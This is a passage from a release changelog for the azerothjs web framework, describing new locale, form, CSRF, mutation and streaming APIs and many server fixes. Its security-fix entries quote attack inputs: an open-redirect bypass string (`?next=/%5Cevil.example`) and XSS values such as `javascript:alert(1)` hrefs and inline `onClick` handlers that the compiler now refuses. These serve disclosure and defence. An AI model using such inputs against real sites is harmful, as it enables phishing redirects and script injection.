  New API on `azerothjs`: `useLocale()` and `useDirection()` read the current language
  reactively, so anything derived from it redraws when it changes - a number reformats into the
  reader's digits without the component knowing it was a number. `setLocale(tag)` switches the
  page and remembers the choice in a cookie, which is what lets the NEXT request be rendered in
  that language on the server rather than corrected after it arrives. `parseAcceptLanguage()`,
  `resolveLocale()` and `localeDirection()` are the negotiation rules themselves, one
  implementation shared by both sides so they cannot drift. Direction comes from `Intl` rather
  than a table, so the languages a hand-kept table forgets - Central Kurdish, Sindhi, Yiddish -
  are right without anyone maintaining them.

  A streamed page stays in one language, boundaries included: the locale is pinned for the
  whole response rather than for the call that started it, so a component rendering inside a
  Suspense boundary that settles later still answers in the reader's language instead of the
  default. Verified in Chromium over a production build: a Persian page's inline-start border
  sits on the right and moves to the left when the language is switched, and the switch survives
  a reload as a server render.

- **A head and SEO guide.** `useHead()` shipped without user-facing documentation: it was
  reachable from the package entry and described only in its own JSDoc, so the rules that
  decide whether a fact reaches a crawler were not written down anywhere a reader would look.
  `docs/head.md` covers what can be declared, how nesting decides precedence, what the client
  does on unmount, the refusal rules above, and the one rule that matters on the server:
  a head fact must be resolvable during the synchronous main pass, which is where a route
  loader's data already is.

  It states the streaming limit plainly rather than leaving it to be discovered. On
  `render: 'stream'` the shell has flushed before a Suspense boundary settles, so a `useHead()`
  declared inside that boundary cannot reach the served document - bytes that have left
  cannot be edited. The declaration is dropped with a development warning naming the remedy.
  This is worth stating because the client applies the same declaration after hydration, so
  the page looks correct in a browser while a crawler never sees it. Both halves of that
  contract are now pinned by tests end to end over a real server: the drop and its
  diagnostic, and loader-derived facts reaching the flushed head on a streamed route.

- **`<Form>`: the same form, enhanced when there is JS.** It renders an ordinary
  `<form method="post">` carrying the CSRF token, so a browser with scripting off posts it
  natively. With JS the submit is intercepted and sent as a fetch that asks the SAME action for
  its JSON representation, then revalidates the page in place - no reload, no lost scroll. A
  refusal lands in `useActionResult()` either way, so the page is written once.

  This also closes a gap the browser found in the previous release of page actions:
  `csrfCookie` mints its token on the RESPONSE, so a visitor's very first page load rendered a
  form with an EMPTY token and its first submit would have failed its own check. `mountPages`
  now resolves the token BEFORE rendering - reusing the cookie a returning visitor has, minting
  one for a first visit - so the markup and the `Set-Cookie` carry the same value.
  `csrfCookie` skips minting when the response already carries that cookie, so composing both
  cannot leave the browser holding one token while the form carries another.

  A page action now answers what the client asked for: JSON when the request explicitly
  accepts it (`{ ok: true }` or `422 { ok: false, result }`), and the redirect-then-render
  otherwise. Asked positively, so a client sending no `Accept` still gets the browser answer
  rather than a body it cannot follow.

- **Page actions: a form that works with no client JS.** A route can declare an `action`, and
  `mountPages` registers a POST for that page's own path. Measured before this existed, a plain
  `<form method="post">` posting to its own page answered **405** with `Allow: GET, HEAD` - the
  mount was GET-only, so a page could not receive the form it rendered.

  Returning `undefined` means the write happened and the answer is a **303 back to the same URL**,
  so the loader re-runs and a refresh cannot re-submit (POST/Redirect/GET). Returning a value
  means it was refused: the page re-renders at **422** with that value readable through the new
  `useActionResult()`, which is where field errors go. Throwing `redirect(...)` sends the visitor
  elsewhere. A page with no action still answers 405.

  CSRF is verified BEFORE the action runs, and it had to be built rather than reused: a plain
  form cannot set a header, and `csrfProtect` documents itself as reading headers only so it can
  never consume a body the handler still needs. The token therefore travels in a hidden `_csrf`
  field, checked by the new `verifyCsrfField` against the same origin and token rules the header
  guard applies - both now call one implementation of each, so they cannot drift. The field is
  stripped before the action sees the form. Give `mountPages` the same `csrf` options you gave
  `csrfCookie`; the defaults agree, and a mismatch fails closed.

- **Prefetching: `<Link prefetch>` and `router.prefetch(to)`.** A link can warm its
  destination before anyone clicks it - lazy chunks download and loaders run - on `"hover"`
  (pointer-enter or keyboard focus), `"viewport"`, or `"render"`. Off unless asked for:
  prefetching spends a visitor's bandwidth on a guess.

  It fills the SAME cache entries the navigation reads, rather than a cache in front of them,
  which is what makes it worth having: hovering and then clicking fetches once, two links to
  one place cost one fetch, and a click landing mid-prefetch joins it instead of starting a
  second. Verified over real network requests in Chromium.

  A warmed value is now held for its first reader for 30 seconds. Without that hold a
  prefetch was discarded by the very navigation it was meant to make instant: a loader entry
  with no subscribers is refetched the moment something subscribes, which is right when
  nobody asked for its value and wrong when somebody asked early. The hold is spent by that
  first reader, so a later visit refetches like any other.

- **Mutations can be cancelled, and can say what overlapping runs do.** `run(input, { signal })`
  cancels one run and `mutation.cancel()` abandons every run in flight; the write now receives
  the signal as its second argument, so it can stop the request itself. A run whose signal is
  already aborted never calls the write at all.

  A cancel withdraws that run's optimistic guess, drops `pending()`, leaves `error()` alone -
  a cancel is not a failure to show anyone - and answers `{ ok: false, cancelled: true }`. Other
  runs keep their own guesses. The invalidation STILL runs: aborting a request cannot un-do a
  write a server may already have committed, so dropping the guess without refetching would
  leave the screen asserting a past it no longer knows. Disposing the surrounding scope does
  not cancel, because a click that starts a write should finish even if the component does not.

  `policy` decides what a second run does while one is in flight: `parallel` (the default, and
  what this did before the option existed), `drop` (refused before anything happens - the
  double-submit guard), `restart` (the runs in flight are cancelled and the newcomer takes
  over) and `queue` (the guess applies at once; the writes run one at a time in CALL order,
  for writes that do not commute). Each is deterministic under overlap: the ordering comes
  from when `run` was called, not from which request answered first.

- **A form can submit to a mutation.** `createForm`'s `onSubmit` now accepts a
  `Mutation` as well as a function. One option, two kinds of target: a mutation is what a form
  submits to, not a second form system.

  Passing the mutation rather than wrapping it is load-bearing, because the obvious hand-wiring
  is silently wrong. `onSubmit: (v) => save.run(v)` resolves even when the write was refused -
  `run` ANSWERS a refusal instead of rejecting - so `submitError()` stayed null and a form bound
  to it reported a success the server never gave. Handed the mutation, the form reads the
  outcome: the refusal lands in `submitError()`, and any field map it carries lands on the
  fields themselves (first path segment wins, the same rule `applyFieldErrors` applies on the
  api client, read structurally so the framework keeps no dependency on the server package).
  `submitting()` covers the whole run, so a button binds to one flag rather than two.

  A FUNCTION `onSubmit` is unchanged, field map included: a thrown refusal still populates only
  `submitError()`, because auto-applying its fields would silently change every form already
  written against it.

- **`createMutation`: the write half of the data layer.** A mutation is the thing a form, a
  button or a keypress submits to. Until now the framework owned reads - `cached`, loaders,
  `revalidate` - and left every application to rebuild the write side around a bare
  `await api.cart.add(item)`: the optimistic guess, the rollback, the invalidation and the
  pending state.

  `createMutation(write, { optimistic, invalidates })` returns `pending()`, `error()` and
  `run(input)`. The optimistic guess goes into the CACHE rather than beside one resource, which
  is the part that could not be built on top: measured before this existed, a header badge and a
  cart page reading the same `cached` family SPLIT during the optimistic window - the page
  showed the new number while the badge sat on the old one for the whole round trip, because a
  guess held in one component cannot leave that component. Both now move in the same frame.

  Guesses are LAYERS on the entry, so two writes in flight are two layers and one failing removes
  exactly its own. On success the guess is promoted into the entry and removed in one synchronous
  step, so nothing renders the confirmed value with its own guess still on top - the double count
  the hand-rolled shape produces between the refetch landing and the override being released. A
  refetch that is slow, or that fails, therefore cannot revert a change the server already took.
  `invalidates` defaults to whatever the guess patched, since omitting it is the mistake that
  silently leaves the screen stale.

  `run` does not reject for a failed write - it answers `{ ok: true, data }` or
  `{ ok: false, error }`, so a fire-and-forget `onClick` cannot become an unhandled rejection.
  Misuse still throws: a patch aimed at something other than a `cached` fetcher is a bug in the
  mutation, not a refusal by the server, and reporting it as an ordinary failure would hide it
  behind a retry button. Two limits are documented rather than papered over: a patch projection
  must be PURE, because it re-runs on every read and on every other run's failure; and guesses
  stack in CALL order while a server applies writes in COMPLETION order, so two concurrent writes
  that do not commute disagree until the revalidation lands.

- **`unauthorized()` and `forbidden()`: a guard can say WHICH refusal it means.** `return false`
  has always vetoed, and the server answered 403 for it, which is right for exactly one of the
  two cases. A signed-out visitor needs 401 so a client, a crawler or an edge cache can tell
  "authenticate and retry" from "never, for you". Both are sentinels in the same family as
  `redirect()` and `notFound()`; `false` keeps meaning 403. The server answers the status and
  server-renders the app's own blocked UI, with the protected component never constructed.

- **`router.state()`: the settled routing verdict.** `match` alone answers null for both an
  unknown URL and a denied one, which is why they used to render the same thing. `state()`
  returns `{ kind: 'match' }`, `{ kind: 'not-found' }` or `{ kind: 'blocked', status }`.
  `<Routes>` dispatches on it, so most applications need it only for a header badge, an
  analytics event or a sign-in prompt outside the routed region.

- **`notFound()`: a loader can declare that its content does not exist.** A route table can only
  answer "no such ROUTE" - whether `/users/42` has a user behind it is something only the loader
  knows, and its only channel was an ordinary throw, which is a server FAULT. So the commonest
  not-found in an application answered 500 to clients, crawlers and caches alike.

  `notFound()` is the second member of `redirect()`'s family and travels the same path: thrown
  from a loader, the server answers 404 instead of 500, and on the client it stays that level's
  loader error where `isNotFound()` tells it apart from a failure. Because the state belongs to
  the level that declared it, an ancestor layout keeps rendering and only the missing level shows
  its empty state. An ordinary throw is still a fault, so a bug does not become a 404.

- **`handleShutdownSignals` gains `beforeShutdown`, a hook that runs while connections are still
  live.** The only lifecycle hook was `beforeExit`, which runs after the drain has already
  finished - the wrong side for anything that needs the sockets to still be there. The
  documentation told applications to send WebSocket 1001 closes "from its own pre-shutdown hook",
  and no such hook existed, so detaching a socket server or flipping a readiness probe could not
  be wired through the documented path at all. The new hook is awaited before the drain begins,
  and its own failure is reported and then ignored, because a failed pre-stop must not leave the
  process holding its port.

- **Work units: any server-side unit of work can own the scope a request gets.**
  `runInWorkUnit(fn)` (from `@azerothjs/http`) runs `fn` with a fresh store scope and a
  cleanup registry, released when it settles - wrap a ws `onConnection` body, background
  regeneration, an app timer, a queue consumer. `createWorkUnitInterceptor(options?)`
  builds the constructor-supplied interceptor `@azerothjs/ws` (`intercept` on
  `ServerSocketOptions`/`attachWebSockets`) and `@azerothjs/cron` (`intercept` on
  `createScheduler`) now accept: each WebSocket application message and each cron run
  becomes one unit with its own cache scope - per-unit caching and single-flighting with
  zero cross-identity sharing, the same isolation HTTP requests already have. The
  optional `deadlineMs` bounds a unit that never settles: on fire the unit's cache scope
  is released and a timeout error reports through the host's reporter; the unit itself
  continues at the released scope, and its cleanups run at the eventual settle (reading a
  released cache - the timeout path cannot promise entry reads). ws's `onMessage` widens
  to `void | Promise<void>`, and an async handler's rejection now reaches the socket's
  `onError` path - wired or not - instead of the unhandled-rejection channel. Both host
  seams are structural types: ws and cron stay zero-dependency.

### Fixed

- **A deep link to an unknown URL got a JSON error instead of your 404 page.** `mountPages`
  registered every declared page path and then an asset fallback, so a URL matching no page and
  no file was answered by the asset handler as `application/json`. The page renderer already
  implements the other answer - render the app's own fallback UI at a real 404 - and the client
  router renders that same `<Routes fallback>` for the same URL, so the two modes disagreed
  about one state and the branch was simply unreachable.

  An unrouted request that ACCEPTS HTML now falls through to the renderer, so a browser
  navigation gets the app's 404 page with a 404 status. A missing image and an unrouted
  `fetch()` still get the JSON their callers can read, because the fall-through is negotiated on
  `Accept`. A client-rendered app gets its shell at a real 404 rather than a soft 404 at 200.

- **`npm start` ran the framework in development mode.** The server templates treat an unset
  `NODE_ENV` as production - the fail-safe default, so a deploy that forgot the variable does not
  put stack traces on the wire - while the runtime computes `DEV` from `NODE_ENV !== 'production'`
  and therefore ran dev warnings, dev checks and dev cost paths on that same deploy. Writing the
  variable into `.env` does not help and never could: the runtime latches the flag while modules
  evaluate, and `process.loadEnvFile()` runs afterwards, so the value reaches the app's config
  and never the runtime's. Only the process environment can, which the shipped Dockerfiles
  already set and `npm start` did not.

  `start` now runs `node --import ./src/deploy-env.ts`, a two-line launcher that sets
  `NODE_ENV` only when it is unset, so `azeroth dev`, a Dockerfile and a process manager all
  keep the mode they declared.

- **A render failure could reach nobody.** `mountPages` documents `console.error` as the default
  for `onError`, and the ISR path had it while both render paths used the observer only if one
  was supplied. An application that wired nothing therefore lost every render-time failure in
  silence, including a streamed boundary that rejected after the shell had flushed. All four
  paths now resolve the observer the same way.

- **The router guide's nested-layout example did not type-check.** It declared
  `props: { children?: unknown }`, which `<Outlet>` refuses. The repair - `MountNode` - is
  exported and always was; the example simply predated it. The guard that should have caught
  this could not: the harness that type-checks shipped examples passed a virtual file path, so
  module resolution had nothing above it, `azerothjs` never resolved, every imported type was
  `any`, and every cross-module error it exists to catch silently vanished. It now checks
  against a real path, as does a new harness over the complete `.azeroth` examples printed in
  the documentation.

- **A declared `routes.stream` producer failure reached stderr instead of your observer.**
  `register` built every SSE route without an `onError`, so `sse()` fell back to its own
  stderr notice - correct as a last resort, but it meant the framework's flagship streaming
  shape was the one place a real fault bypassed the app's configured observer. Declared stream
  routes now report through `AppOptions.onStreamError` like any other post-commit stream fault.

- **Added `onStreamError`: a streaming producer that failed after the headers were sent
  reported to nobody.** An SSE client dropped for
  falling `maxBufferedBytes` behind is deliberately excluded: ending its stream requires
  erroring it, which the kernel cannot distinguish from a producer dying, so the layer that
  knows now marks it as client-caused. Such a failure cannot become a status - the headers left long ago - so
  the consumer received a truncated body while the server recorded the 2xx it had already sent,
  and over h2c that truncation is byte-identical to a normal end, invisible on both sides. The
  new `AppOptions.onStreamError` receives the error and its request. It is deliberately NOT
  `onError`: that seam hands over a mapped `HttpError` carrying a status, and a committed
  stream has none left to map, so routing through it would mean fabricating a response that
  never existed. A throwing reporter is isolated, so it can take down neither the consumer's
  error propagation nor the request's teardown. Coverage is honest: this is a streaming
  `Response` the kernel monitors. An SSE stream closes cleanly on a producer rejection and
  reports through `sse()`'s own `onError`; a body the kernel could not monitor (the handler
  took its own reader) is still unreported.

- **A failing error observer could take the whole server down.** These sinks are consumer code
  the framework calls to TELL it something, so a failure has nowhere to go and must not
  propagate - but two shapes had to be contained and only one was. A SYNCHRONOUS throw inside a
  floating promise becomes an uncaughtException, whose default disposition exits the process; an
  `async` sink declared `void` rejects in a way a `try/catch` around the CALL never sees.
  Measured in a child process: a throwing `onStreamError` on a declared `routes.stream` route
  exited(1), taking every other live connection with it, and an async-rejecting one exited(1)
  through a seam whose synchronous throw was already guarded. Every reporting sink now goes
  through one isolation helper that normalizes both shapes - `onStreamError` at all three call
  sites, `sse()`'s own `onError`, and `onCleanupError`.

  A sweep for the same defect class then found two more, both in the node adapter and both
  outside any promise chain. `serve(app, { before })` - the connect-middleware seam the docs
  suggest for `vite.middlewares` - was invoked bare inside the `'request'` listener, so a
  throwing middleware exited the process and an `async` one did too, even after it had already
  called `next()` and the request had been answered normally. And a `WebHandler` whose
  `handle` throws SYNCHRONOUSLY never produces the promise the adapter's `.catch` guards, so
  that throw escaped the listener as well - through the one shape the comment calling it "the
  LAST line of defence for the process" could not see. Both now end in the same 500 the seam
  already used for `next(error)`. Measured: each killed the process deterministically and reset
  an unrelated request that was in flight at the time, while an identical throw one frame deeper
  was a clean 500 with the server alive.

- **A keep-alive connection accumulated one disconnect watch per request it served.** The
  watch was detached from the REQUEST's close, but on http1 a fully consumed IncomingMessage
  closes at the end of its body - long before a streaming response finishes - so a watch
  installed after that point was never detached at all. Measured over one raw keep-alive socket:
  32 socket listeners across 30 requests, with a MaxListenersExceededWarning at the eleventh,
  each holding a live AbortController and closure until the connection finally closed. It was
  never error-path-specific: a plain successful response counts as streaming, so the request
  root reads the signal there too, and a 200 control leaked identically. The watch is now
  released when the RESPONSE closes, which is the only event that bounds both the request and a
  body still being written - measured flat at 2 afterwards, with a control confirming a real
  client disconnect still aborts.

- **A route with no search schema typed its loader's query as unreadable.** The branch that
  hands back the raw query was guarded by `[Search] extends [never]`, but the default is
  `Record<string, never>`, which does not extend `never` - so the branch was unreachable and
  every query read on a schema-less route collapsed to nothing (`never`, or `undefined` under
  `noUncheckedIndexedAccess`). It failed silently rather than loudly: nothing errors at the
  read, it propagates into whatever the loader builds and poisons the handle's inferred data,
  while the runtime hands over the raw query all along. The guard now tests the VALUE type, which
  is empty for both the default and an explicit `never` and real for any declared schema, so a
  schema-less route reads its raw query again and a declared one still narrows.

- **The off-origin redirect refusal was bypassed by a backslash.** A URL parser folds a
  backslash to a slash in the authority position for a special scheme, so `/host`,
  `\host`, `/host` and `//host` all resolve to `host` exactly as `//host` does -
  but the classifier matched only on `//`, so every one of those spellings was judged an
  internal path while a browser navigated off-origin. Verified: all four resolve to a foreign
  origin with the refusal returning false. That made the documented
  `guard: ({ query }) => redirect(String(query.next))` idiom an open redirect via
  `?next=/%5Cevil.example`, through the boundary that exists to refuse exactly that, and it
  reached both the redirect Location and a `useHead` meta-refresh. Only the leading pair is
  folded, so an ordinary path or query carrying a backslash is unaffected.

- **An over-limit request body was recorded as a broken upload rather than as too large.**
  `destroy()` synchronously emits `'aborted'`, whose listener rejected first, so the honest
  `PayloadTooLargeError` lost a race with "the request body was not fully received" and the
  server's own log named a network fault that never happened. The rejection now precedes the
  destroy. Scope worth stating: on http1 the client receives no response either way, because the
  destroy resets the connection - this corrects what the SERVER records. On h2c the client does
  receive its 413, which is why the limit path deliberately does not reset the stream: doing so
  discards that response entirely, and silently.

- **On h2c, `request.signal` reported that the client had hung up on every SUCCESSFUL
  request.** `incoming.socket` is a per-stream proxy there rather than the connection, so its
  `close` fires on a normal end exactly as on a reset. Four things now read that value -
  `clientGone`, the log de-escalation of a 5xx, the `onStreamError` exclusions, and SSE's
  abort-to-end - so it mattered. h2 now takes the request's `'aborted'` event, which Node emits
  for a reset and skips for a clean finish; http1 keeps its socket-close path untouched, because
  on that transport the body-limit path's own `destroy()` emits `'aborted'` for a client that
  never left. The trade is stated in the code rather than hidden: a client that resets AFTER the
  response was written no longer aborts on h2, where http1 still does - a false positive on every
  successful request exchanged for a false negative on a request whose work was already finished.
  Nothing in the framework reads the signal that late.

- **On h2c the server never noticed a client disconnect, so every such request leaked and a
  graceful drain never returned.** `Http2ServerResponse` has no `destroyed` property at all -
  `'destroyed' in res` is false - so the adapter's liveness checks read as "still alive" on
  every h2c disconnect: a producer's `cancel()` never ran on ANY h2c path, and an RST_STREAM
  with NO_ERROR (what `fetch` with an `AbortController` and a browser navigating away actually
  send) left the write loop parked on a `drain` that could never arrive, so `request.signal`
  never aborted, the request root never settled, every `onWorkUnitCleanup` was held for the
  process lifetime, and `shutdown()` ran past its grace deadline - measured 5010ms against a
  300ms grace. Liveness is now read from the h2 stream, the backpressure wait watches the stream
  rather than the response (whose own close cannot arrive while the write side is parked), and a
  stream the client reset is destroyed so the drain can complete. Measured after: signal,
  cleanup, and producer cancel all at ~1ms on all three h2c disconnect shapes, with shutdown at
  1ms. http1 is unchanged.

- **A streaming source whose own `cancel()` rejected cost its request every cleanup.** A
  rollback that fails or a pool release that throws is ordinary code, but that rejection
  propagated out before teardown ran, so every `onWorkUnitCleanup` - the pooled connection, the
  transaction, the advisory lock - leaked for the process lifetime. Teardown now runs in a
  `finally`. The rejection still reaches whoever cancelled; it no longer takes the cleanups
  with it.

- **A streaming client's disconnect tore the request down while the producer was still
  unwinding.** Cancelling a response body resolves the in-flight read with `done: true` before
  the source's own `cancel()` runs, so the kernel's pull woke, called `close()` on a
  controller the consumer had already closed - throwing a `TypeError` manufactured out of an
  ordinary disconnect - and its catch then ran the request's cleanups immediately. Measured:
  teardown at 1ms against a source cancel finishing at 201ms. That inverts the guarantee the
  wrapper exists for, which is that teardown releasing a pooled connection, transaction, or lock
  must not fire while the stream is still pulling through it. The cancel branch now owns the
  settle when the body is cancelled WITHOUT the request also being aborted. This also clears the
  way for reporting genuine mid-stream producer faults, which previously could not be
  distinguished from this manufactured one.

  Known gap, stated because the change above does not reach it: over a real socket a client
  disconnect aborts `request.signal` at the same instant it cancels the body, and the request
  root's abort-as-settle listener still runs teardown immediately - measured at 6ms against a
  source whose own `cancel()` finished at 207ms. So on the socket path teardown can still
  precede a producer finishing its unwinding. Closing that requires the abort listener to wait
  for an in-flight source cancel, which is a separate change.

- **A streamed page that failed after the shell had flushed reported the failure to nobody.**
  `renderToStream` surfaces a Suspense boundary's rejection through its `onError`, and kit
  constructed it without one - so the client received a page missing a boundary while the server
  recorded a clean 200, the one shape no observability seam can see. It cannot be a status: the
  head left long before the failure. `PageRenderOptions` gains `onError`, `mountPages` wires
  it to the observer you already pass, and `KitErrorObserver`'s phase gains `'stream'`.

  MIGRATION: widening that union is a source-compatible change that can still fail at RUNTIME.
  An observer written as an exhaustive `switch (phase)` with a throwing `default` keeps
  compiling and starts throwing the first time a stream fails, and an observer's throw is
  reached on the unhappiest path there is. Check any exhaustive handling of `phase` before
  upgrading.

  Note
  the honest boundary: this covers kit's streamed SSR. A hand-rolled `new Response(stream)`
  whose producer throws mid-body is still unreported by the kernel, and routing SSE's producer
  failures (today stderr, via `sse()`'s default) to the app's observer is likewise still open.

- **An abandoned request was reported as a server fault.** A handler or loader that honours
  `request.signal` - the shape the router documents - rejects when the client disconnects, and
  that rejection mapped to a 500 like any other: measured, 20 of 20 abandoned requests produced
  an `onError` call and a 500 in `observe.onComplete`, which `logRequests` escalated to
  error level. A deployment that alerts on 5xx counts therefore read its page-abandon rate as
  its server error rate. The error observer now receives a third argument, `{ clientGone }`,
  and `logRequests` records an abandoned 5xx at info with `clientGone: true` instead of
  escalating it. Nothing is suppressed and no status changed: "aborted" does not prove the abort
  CAUSED the error - a handler's own timeout controller, a mutating call handed the request
  signal, and a graceful-shutdown drain all raise `AbortError` on an aborted request while
  being real faults - so the report still fires and the flag is there to classify it. The signal
  is read only on paths already failing, so an ordinary request never materializes it.

- **The server re-flattened the whole route table on every selection; it is now memoized per
  route array.** Every server-side selection paid one full flatten plus a `compilePath` per
  leaf - a warm ISR hit pays one (the guarded predicate runs before the cache read), an SSR
  render two, an ISR cold miss three - where the client flattens once at construction. Measured
  server CPU on a warm hit, transport included: at 41 leaves roughly 62us falls to 38us, and at
  251 leaves roughly 167us falls to 69us. Below about 40 leaves the gain is within noise, so
  this matters for real tables rather than small ones. The memo is TOP-LEVEL ONLY by
  construction: `flattenRoutes` itself is untouched, because a `children` array mounted under
  two parents is legal and a memo consulted inside the recursion would hand the second parent
  the first's chains, making `guardedMatch` answer about the wrong chain - an authorization
  bypass, not just wrong routing. **New invariant:** do not mutate a routes array after its
  first server-side selection. The memo keys on array identity, so a route appended afterwards
  is invisible, and it fails OPEN - a guard added late would not be seen. Build a new array
  instead; it simply misses the memo. `createRouter` deliberately still flattens per call,
  because `RouteMatch.matched` is public and mutable and reaching components through
  `useMatch()`.

- **Documented that open connections do NOT bound concurrent ISR renders.** A cold production
  outlives the request that started it, so a client that issues requests and drops each socket
  immediately buys far more work than one that waits: measured at a fixed 8 sockets over one
  second against a 60ms render, waiting yields 104 renders at peak concurrency 8 (its connection
  count), while dropping yields 1568 renders at peak concurrency 202. Edge rate limiting is
  therefore load-bearing for ISR rather than optional, and the kit README now says so with the
  numbers. No behaviour changed: cancelling an abandoned production was designed and rejected on
  measurement - on a cold path its output is what the next visitor gets served (aborting turns
  useful work into repeated work), and the loader fan-out is issued synchronously around 0.8ms
  while a socket reset is not observable until around 1.9ms, so no cancellation signal can
  prevent it.

- **Corrected a work-unit deadline doc that told operators a released scope was write-safe.**
  `createWorkUnitInterceptor({ deadlineMs })` documented that a unit continuing past its
  deadline gets "direct fetches, correct data". Measured, that holds only for a read STARTED
  AFTER the release; a read already IN FLIGHT resolves `undefined`, because releasing aborts
  the fetch and resolves its waiters - and that prompt, total resolution is what keeps teardown
  bounded, so it is deliberate rather than a bug. No behaviour changed, but if you set
  `deadlineMs` on a ws host, a unit that keeps running must not PERSIST on a value it read
  across the release. Fixing the cache instead was designed, reviewed, and rejected: it broke
  the boundedness the deadline exists for, and did not even close the hazard, since a
  revalidating entry would hand back stale data rather than `undefined`.

- **A malformed declaration could silently drop its value; the compiler now rejects the
  shape with a named, located error.** `state rows[] = [1, 2]` emitted
  `createSignal(undefined)` - the `[]` suffix is `form`-only per the grammar, TypeScript's
  error recovery ate the initializer, and nothing checked - and the same fate met any
  broken spelling between a declaration's name and its `=` (`store` and `derived`
  included, nested declarations in effect bodies and initializer arrows included). With
  type checking on (the default) these shapes already failed the build, but as a cryptic
  mapped syntax error; with `typeCheck: false` they shipped silently corrupted. Two rules
  now reject them everywhere the compiler runs (build, dev server, language server,
  eslint, `azeroth-tsc`): `azeroth/array-suffix` points at the brackets and at the
  `form NAME[]` / `state NAME = [...]` spellings, and `azeroth/malformed-declaration`
  fires when the declaration's parse fails to recover an initializer or recovers an
  artifact one - keyed on the parse outcome, so arrow types
  (`state cb: (e: Event) => void;`), markup-bearing values, and every other legal shape
  stay silent. The dev server surfaces the named
  finding ahead of the type check, and the misleading `constant-derived` hint no longer
  fires on a declaration the shape rules already flagged.

- **A refused value could still reach the browser through the compiled template.** The
  render-safety gate judges every value the runtime writers put in the document, but a
  STATIC tag or attribute is folded into a clone template that no runtime writer inspects
  - so one component source threw in server rendering and rendered on the client:
  `<a href="javascript:alert(1)">`, `<div onClick="alert(1)">` (a live inline handler),
  `<base href>`, `<iframe srcdoc>`, an executable `<script>`. In a `dom`-target build the
  gated branch is not emitted at all, so nothing judged those values in any mode. The same
  policy is now applied at BUILD time over exactly the values that fold - including
  constant-folded expressions such as `href={'javascript:' + x}`, which land in the same
  template - and the policy itself moved into `azerothjs/semantics` so the compiler and the
  runtime share one copy rather than restating it. Tag-awareness is preserved (an inline
  image `data:` URL still passes on `<img src>` and `<video poster>` while the same string
  is refused on `<a href>`), a `<script>` whose `type` is dynamic is left to the runtime
  gate that can resolve it, and `unsafeUrl(...)`/`unsafeTag(...)` are unaffected: they are
  expressions, never fold, and reach the runtime branded. One behavior change worth
  calling out for client-only builds: a static non-image `data:` URL in a URL attribute
  (`<link href="data:font/woff2;...">`) was already refused in server rendering and is now
  a build error everywhere - wrap it in `unsafeUrl(...)` if it is deliberate.

- **The DEV family registry no longer retains dynamic `cached()` names forever.** The
  hot-swap registry (family name to shared record) was an add-only map holding each
  family's fetcher closure and everything it captured, ungated by anything but DEV - so
  a per-tenant or per-request family name retained one closure per distinct name for the
  process lifetime. The registry now holds records weakly with a finalization reaper: a
  module-held family survives through its own fetcher (hot-swap semantics unchanged), a
  dropped dynamic name is collected, and the name re-registers cleanly afterward.

- **`bind:value={v} value="y"` on a host element compiled silently; it is now the
  collision the grammar always said it was.** The uniqueness rule's consequence - a
  `bind:p` claims its target key `p` - was enforced on components (`azeroth/duplicate-prop`)
  but not on host elements, so the static attribute baked into the cloned template and
  fought the binding, last writer winning silently. Host elements now claim the bind's
  target key too: `bind:value` + `value` (either order, any bind target) is
  `azeroth/duplicate-attr`, naming both writers. The audit of that fix closed two
  adjacent escapes sheltered by the same literalism: host attribute claims are now
  CASE-FOLDED (HTML parses host attribute names case-insensitively, so `value` and
  `VALUE` were always one parsed attribute - and `onMouseDown` + `onMousedown` attached
  two client listeners while string rendering silently kept one), and a static or bare
  `bind:` (`bind:value="lit"`, `bind:value`) is now `azeroth/bind-value` on hosts and
  components alike - it never bound, and on a host it baked a literal `bind:value`
  attribute into the document. The grammar's compositions are untouched: an authored
  `onInput` still composes with `bind:value`'s write-back, and `class:`/`style:`
  directives still merge with their base attribute. GRAMMAR.md's uniqueness section now
  states the claimed-name rule it always implied.

### Changed

- **The normative language documents no longer name a version train.** GRAMMAR.md
  declared itself normative "for the 1.x train" and STABILITY.md froze "the 1.x keyword
  set", two majors after that train ended - a frozen-set policy scoped to a dead train
  answers nothing about today's set. Both documents now state their rules per MAJOR
  TRAIN (the freeze, the shape rubric, and the ASCII identifier rule scope to the train
  the package version belongs to), so they cannot rot again at the next major; GRAMMAR's
  dangling cross-references to folded subsections are repaired. No rule changed.

- **`onRequestCleanup` is renamed to `onWorkUnitCleanup`.** A request is one kind of work
  unit, and the registry serves them all - a ws message, a cron run, a `runInWorkUnit`
  body - so the request-shaped name and its "outside a request" error were wrong the
  moment a unit registered teardown. Mechanical migration: rename the import; no alias
  ships. `setStoreScopeResolver` (internal) now REFUSES a second, different registrant
  loudly instead of silently replacing the first - a silent replacement permanently
  collapsed the first host's isolation; same-function re-registration is a no-op and
  `null` still uninstalls.

### Fixed

- **A render's head and styles now belong to a frame its host owns - closing the two ways
  the old shared frame could betray a response.** Head declarations and per-render css
  used to collect into module-level state keyed on a store scope, with drains that read
  whatever was armed last. Two measured consequences: a request that rendered without
  collecting could have its head - title, meta, private loader-derived values - served
  inside ANOTHER request's document by whoever drained next; and a streamed page whose
  Suspense boundary settled quickly LOST its own title, meta and styles, silently in
  production, because the continuation's cleanup could only name the shared scope and so
  wiped the main render's frame. Now a host constructs a frame (`createRenderFrame()`),
  passes it through the render options, and drains exactly that render's output - held
  before the render runs, still in hand when it throws, immune to interleaving; stream
  continuations write to internal frames that are always dropped (the head has already
  flushed), and the framework's own servers pass frames everywhere. The zero-argument
  `collectStyleSheet()`/head drains still work for a synchronous single-render host,
  byte-identically. Two zero-argument shapes change, both fail-closed with a dev
  diagnostic and NEITHER render's output ever cross-served: a host that renders twice
  before draining, and a host that declares head facts but only ever drains styles (the
  head drain is internal, so that is the only zero-argument drain a third-party host can
  reach) - its undrained head data makes the next render's seal drop both. And one benign
  divergence: a second zero-argument head drain now re-serves the SAME render's head
  while its styles are still undrained, where it previously returned empty - own data,
  same host. The app-wide stylesheet registry (`style { }`
  sections and module-load css templates) is always served regardless.

- **A head value the runtime could not represent failed the whole response - and could
  replace a real error with a `TypeError`.** Serializing the collected head runs inside
  the host's cleanup path, so a jsonLd block with a hole or a BigInt, or a non-string
  composed title, threw AFTER a perfect render and turned it into a 500; worse, a prior
  render's undrained head could convert a later request's genuine error into that
  `TypeError`. Every head serialization site now refuses by drop on both faces: the
  offending block or title is dropped with a dev diagnostic naming it, its siblings and
  their dedup identities are untouched, and the response proceeds. Dropping a broken
  title is correct, not merely safe - the head contract has a single empty-title owner,
  so an absent title falls back exactly as an undeclared one does.
- **`useHead()` on a server without a DOM killed the process.** Outside a server render,
  `useHead` armed its head-sweep microtask without ever checking that a `document` exists; the
  sweep then dereferenced `document.head` outside any catchable frame and exited the
  process with an error no application code could intercept. The environment is now
